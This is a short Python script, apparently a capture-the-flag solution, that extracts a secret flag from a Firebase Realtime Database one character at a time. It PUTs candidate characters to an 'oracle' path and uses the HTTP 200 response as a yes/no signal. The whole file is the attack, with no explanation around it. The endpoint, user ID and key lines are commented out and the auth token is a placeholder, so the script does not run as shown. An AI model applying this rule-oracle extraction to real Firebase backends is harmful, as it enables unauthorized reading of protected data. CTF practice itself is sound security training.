import requests
# uid = ''
# api_key = ""

# endpoint = 'https://udctf-fire-default-rtdb.firebaseio.com/oracle/'

flag = ""
x=0
while True:
    for c in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890{}':
        url = endpoint + uid + '/' + str(x) + ".json"
        params = {"auth": "auth token", "key": api_key}
        data = '"' + c + '"'
        r = requests.put(url,params=params, data=data)
        print(url)
        print(r.text)
        if r.status_code == 200:
            flag+=c
            print(flag)
            break
    else:
        break
    x+=1

print()
print(flag)